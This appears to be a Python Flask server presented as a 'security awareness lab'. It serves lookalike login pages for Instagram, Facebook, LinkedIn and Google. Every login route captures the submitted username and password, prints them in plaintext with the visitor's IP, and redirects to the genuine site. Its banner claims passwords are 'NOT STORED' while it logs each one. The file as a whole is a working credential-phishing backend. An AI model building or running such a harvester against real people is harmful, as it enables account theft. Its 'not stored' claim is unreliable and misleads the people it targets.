from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)


def get_client_ip():
    """Extract real client IP handling proxy headers."""
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr


def log_attempt(platform, username, password, ip_address):
    """Log training attempt metadata."""
    print()
    print("=" * 60)
    print("        SECURITY AWARENESS EVENT")
    print("=" * 60)
    print(f"Platform         : {platform}")
    print(f"IP Address       : {ip_address}")
    print(f"Username         : {username or '[empty]'}")
    print(f"Password         : {password or '[empty]'}")
    print(f"Time             : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()


@app.route("/")
def home():
    return "Security Awareness Lab"


# --- Instagram Routes ---
@app.route("/instagram/")
def instagram():
    return render_template("instagram/index.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    ip_address = get_client_ip()

    log_attempt("Instagram", username, password, ip_address)
    return redirect("https://www.instagram.com/")


# --- Facebook Routes ---
@app.route("/facebook/")
def facebook():
    return render_template("facebook/index.html")


@app.route("/facebook/login", methods=["POST"])
def facebook_login():
    username = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    ip_address = get_client_ip()

    log_attempt("Facebook", username, password, ip_address)
    return redirect("https://www.facebook.com/")


# --- LinkedIn Routes ---
@app.route("/linkedin/")
def linkedin():
    return render_template("linkedin/index.html")


@app.route("/linkedin/login", methods=["POST"])
def linkedin_login():
    username = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    ip_address = get_client_ip()

    log_attempt("LinkedIn", username, password, ip_address)
    return redirect("https://www.linkedin.com/")


# --- Google / Gmail Training Routes ---
@app.route("/gmail/")
def gmail():
    return render_template("google1/index.html")


@app.route("/google-training/next", methods=["POST"])
def google_next():
    identifier = request.form.get("identifier", "").strip()
    ip_address = get_client_ip()

    print()
    print("=" * 60)
    print("         GOOGLE PAGE  1")
    print("=" * 60)
    print(f"IP Address        : {ip_address}")
    print(f"Username          : {identifier or '[empty]'}")
    print("Password entered  : NO")
    print("=" * 60)
    print()

    return render_template(
        "google2/index.html",
        identifier=identifier
    )


@app.route("/google/complete", methods=["POST"])
def google_complete():
    identifier = request.form.get("identifier", "").strip()
    password = request.form.get("password", "").strip()
    ip_address = get_client_ip()

    log_attempt("Google / Gmail", identifier, password, ip_address)

    return redirect("https://accounts.google.com/")


if __name__ == "__main__":
    print("=" * 60)
    print("        SECURITY AWARENESS LAB")
    print("=" * 60)
    print("[+] Local server : http://127.0.0.1:5000")
    print("[+] Passwords    : NOT STORED")
    print("=" * 60)

    app.run(
        host="127.0.0.1",
        port=5000,
        debug=False
    )
